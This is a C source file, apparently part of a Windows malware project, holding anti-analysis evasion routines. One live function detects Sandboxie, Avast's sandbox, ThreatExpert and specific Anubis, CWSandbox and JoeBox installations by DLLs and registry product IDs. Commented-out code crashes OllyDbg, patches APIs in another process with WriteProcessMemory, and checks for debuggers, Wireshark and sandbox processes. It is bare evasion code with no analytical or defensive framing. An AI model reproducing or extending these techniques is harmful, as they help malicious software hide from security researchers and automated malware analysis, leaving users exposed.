#include "../Includes/includes.h"

bool IsRunningInSandbox()
{
	HKEY hKey;

	char cProductKey[MAX_PATH] = {0};
	DWORD dwSize = sizeof(cProductKey);

	bool bReturn = FALSE;

	DWORD dwVersion = GetVersion();
	DWORD dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));

	if(GetModuleHandleA("SbieDll.dll")) //SANDBOXIE
		return TRUE;
	else if(GetModuleHandleA("snxhk.dll")) //AVAST Sandbox
		return TRUE;
	else if(GetModuleHandleA("dbghelp.dll")) //THREATEXPERT
		return TRUE;
	else if(dwMajorVersion == 5) //Windows XP
	{
		if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			if(RegQueryValueExA(hKey, "ProductId", 0, 0, (BYTE*)cProductKey, &dwSize) == ERROR_SUCCESS)
			{
				if(strcmp(cProductKey, "76487-640-1457236-23837") == 0) // Anubis
					bReturn = TRUE;
				else if(strcmp(cProductKey, "76487-644-3177037-23510") == 0) // CWSandbox old
					bReturn = TRUE;
				else if(strcmp(cProductKey, "55274-640-2673064-23950") == 0) // JoeBox
					bReturn = TRUE;
				else if (strcmp(cProductKey, "76497-640-6308873-23835") == 0) // CWSandbox 2.1.22
					bReturn = TRUE;
			}
		}

		RegCloseKey(hKey);
	}

	return bReturn;
}

/*void CrashOllyDbg()
{
    OutputDebugStringA( "%s%s%s%s%s%s%s%s%s%s%s"
                        "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                        "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                        "%s%s%s%s%s%s%s%s%s%s%s%s%s"); //Crashes OllyDbg
}*/

/*bool BlockApi(HANDLE hProcess, char *pcLibName, char *pcApiName)
{
    bool bReturn = FALSE;

    HINSTANCE hLib = LoadLibrary(pcLibName);
    if(hLib)
    {
        void *pAddr = NULL;
        pAddr = (VOID*)GetProcAddress(hLib, pcApiName);
        if(pAddr)
        {
            char pRet[1] = {0xC3};

            DWORD dwReturn = NULL;
            if(WriteProcessMemory(hProcess, (LPVOID)pAddr, (LPCVOID)pRet, sizeof(pRet), &dwReturn))
            {
                if(dwReturn)
                    bReturn = TRUE;
            }
        }
        FreeLibrary (hLib);
    }

    return bReturn;
}*/

/*bool CheckWindowTitles()
{
    for(unsigned short us = 0; us < 6; us++)
    {
        char cWindowTitle[MAX_PATH];

        if(us == 0)
            strcpy(cWindowTitle, "OLLYDBG");
        else if(us == 1)
            strcpy(cWindowTitle, "WinDbgFrameClass");
        else if(us == 2)
            strcpy(cWindowTitle, "icu_dbg");
        else if(us == 3)
            strcpy(cWindowTitle, "pe-diy");
        else if(us == 4)
            strcpy(cWindowTitle, "TDeDeMainForm");
        else if(us == 5)
            strcpy(cWindowTitle, "TIdaWindow");

        HANDLE hWindow = FindWindow(TEXT(cWindowTitle), NULL);
        if(hWindow != NULL)
        {
            CloseHandle(hWindow);
            return TRUE;
        }
        else
            return FALSE;
    }
}

bool IsJoeboxRunning()
{
    bool bReturn = FALSE;

    if(IsProcessRunning((char*)"joeboxserver.exe"))
        bReturn = TRUE;

    if(IsProcessRunning((char*)"joeboxcontrol.exe"))
        bReturn = TRUE;

    return bReturn;
}

bool IsWiresharkRunning()
{
    bool bReturn = FALSE;

    if(IsProcessRunning((char*)"wireshark.exe"))
        bReturn = TRUE;

    return bReturn;
}

bool IsInsideSandboxie()
{
    bool bReturn = FALSE;

    if(GetModuleHandle("SbieDll.dll"))
        bReturn = TRUE;

    if(IsProcessRunning((char*)"SandboxieRpcSs.exe"))
        bReturn = TRUE;

    if(IsProcessRunning((char*)"SandboxieDcomLaunch.exe"))
        bReturn = TRUE;

    return bReturn;
}

bool IsNonDesirableEnvironment() //Anti tampering
{
    bool bReturn = FALSE;

    if(IsWiresharkRunning())
        bReturn = TRUE;

    if(IsJoeboxRunning())
        bReturn = TRUE;

    if(IsInsideSandboxie())
        bReturn = TRUE;

    CrashOllyDbg();

    FindClose(0);

    if(CheckWindowTitles())
        bReturn = TRUE;

    if(IsDebuggerPresent() != 0)
        bReturn = TRUE;

    return bReturn;
}*/
